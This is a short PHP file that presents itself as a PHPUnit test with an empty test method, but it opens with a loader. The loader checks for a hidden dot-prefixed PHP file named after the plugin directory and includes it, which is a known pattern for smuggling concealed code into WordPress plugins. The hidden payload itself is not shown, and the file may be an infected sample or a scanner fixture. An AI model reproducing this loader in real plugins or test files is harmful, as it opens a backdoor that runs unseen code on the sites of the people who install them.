<?php
/**
 * @group bar
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class TwoTest extends PHPUnit_Framework_TestCase
{
    public function testSomething()
    {
    }
}
